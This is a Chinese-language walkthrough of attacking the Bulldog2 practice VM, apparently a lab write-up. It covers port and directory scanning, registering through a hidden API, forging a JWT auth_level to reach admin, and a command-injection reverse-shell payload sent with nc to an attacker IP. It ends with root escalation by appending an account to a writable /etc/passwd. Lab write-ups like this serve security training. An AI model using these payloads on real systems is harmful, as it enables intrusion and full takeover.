

# bulldog2渗透实战

![image-20210919154708995](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919154708995.png)



```
masscan --rate=10000 --ports 0-65535 192.168.100.154
```

![image-20210919154533322](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919154533322.png)

```
whatweb 192.168.100.154
```

![image-20210919154605033](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919154605033.png)

```
dirsearch  -u http://192.168.100.154
```

![image-20210919155310177](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919155310177.png)

- 根据扫描到的目录，没有发现什么可用的信息，继续探索；
- 查看前端代码，发现首页调用了四个js文件，我们可以分别进行访问；
- 我们查看页面的时候，发现页面上角有个注册功能，但是不能进行注册；
- （猜测：如果可以注册成功的话，就可以进行登录）



- 尝试在美化后的js文件中使用Register关键字进行搜索

http://192.168.100.154/main.8b490782e52b9899e2a7.bundle.js

![image-20210919160857795](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919160857795.png)

- 可以发现注册所需的信息为四条，name、email、username、password，
- 我们可以根据这四条信息进行模拟注册；

>  **使用Burpsuite抓包进行注册账号；**

![image-20210919161332309](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919161332309.png)

![image-20210919161627715](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919161627715.png)

## 注册成功

![image-20210919161743928](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919161743928.png)



- 登录账户的用户名都会在链接中显示，

- 将链接中的用户名更改后就可以直接登录到另外的账户；
- 尝试水平越权,但是这几个账户都没有什么可以利用的信息；

>  通过Burpsuite抓包查看服务器回包的信息

![image-20210919162631497](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919162631497.png)

- 返回包 带有一个JWT开头的token字段；这个token传递了什么信息呢；
- JWT（Json Web Token）的声明，一般用于身份提供者和服务提供者间，
- 来传递被认证的用户身份信息，以便从资源服务器获取资源，
- 也可以增加一些额外的其他业务逻辑所必须的声明信息
- 该token也可直接被用于认证或被加密；

##  **查看token信息**

[jwt解密](https://jwt.io/)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiIxMTEiLCJlbWFpbCI6IjIyMiIsInVzZXJuYW1lIjoieGlhbyIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIn0sImlhdCI6MTYzMjAzOTg3NywiZXhwIjoxNjMyNjQ0Njc3fQ.67NR-n9OGYI-Wxq0oOjVLjW7bRjFTHW1E4VgfGq3zME
```

![image-20210919163441104](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919163441104.png)

>  可以看到有个auth_level的参数，通过名字可以看出是关于用户权限的，
>
> 我们可以使用这个参数去在js文件中进行搜索；auth_level

![](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919163854306.png)

> 将回包中的standard_user替换成master_admin_user；将回包中的编码替换；

![image-20210919164538034](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919164538034.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiIxMTEiLCJlbWFpbCI6IjIyMiIsInVzZXJuYW1lIjoieGlhbyIsImF1dGhfbGV2ZWwiOiJtYXN0ZXJfYWRtaW5fdXNlciJ9LCJpYXQiOjE2MzIwMzk4NzcsImV4cCI6MTYzMjY0NDY3N30.9qtAv37t4szJADxnXwb3PKldhZkj55olOMNRJmdwhkI
```

## 退出账号并重新登录

**抓包——>Do intercept——>response to this request；**

然后forward，获取如下页面，复制修改后的新编码替换原来的编码，

注：后面明文处也要修改成“master_admin_user”，然后一直forward；

![image-20210919165624692](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919165624692.png)

# 此时，登录上去的账号为admin

![image-20210919165701795](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919165701795.png)

## 修改密码处存在命令执行漏洞，获取shell

- 密码不正确，但是服务器返回的状态码依然是200；
- 可以发现页面返回的状态码是200，但是最后一行显示的是false；

![image-20210919165943879](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919165943879.png)

## 直接在修改密码处执行漏洞拿反弹shell；

![image-20210919170905380](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919170905380.png)

```
"password": "111 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.143 1234 >/tmp/f;"
```

## kali

```
nc -lvp 1234  
```

 ![image-20210919171013784](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919171013784.png)

## 成功获取到shell后，就需要进行提权操作

```
cd /etc
ls -la |grep passwd
```

![image-20210919182501195](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919182501195.png)

- 查看passwd文件的权限；可以看到权限为777
- 添加一个新的具有root权限的账户；

```
python -c 'import pty; pty.spawn("/bin/bash")';
perl -le 'print crypt("pass", "aa")'
```

![image-20210919182809769](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919182809769.png)

> 其中，pass为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等）

> 如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。

> 所以，加密盐其实是必须的参数

## 将新创建的用户写到passwd文件中；

```shell
echo 'xiu:aaW3cJZ7OSoQM:0:0:xyz:/root:/bin/bash' >>passwd
```

![image-20210919183225929](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210919183225929.png)



1. 一般情况下，如果网站没有发现什么可利用的目录，就可以尝试**查看js页面**，一般会有突破口；
2. 如果一个页面输入的用户名或密码错误，但是返回的状态码依然是200的话，就可以尝试进行**命令执行漏洞**，获取shell；
3. 如果**普通用户**权限对/etc/passwd文件有**写**权限，我们就可以提权时创建一个新用户（perl -le 'print crypt("pass","aa")'），将其以root用户的格式写入/etc/passwd文件中，然后su 创建的用户 就可以提权成功；

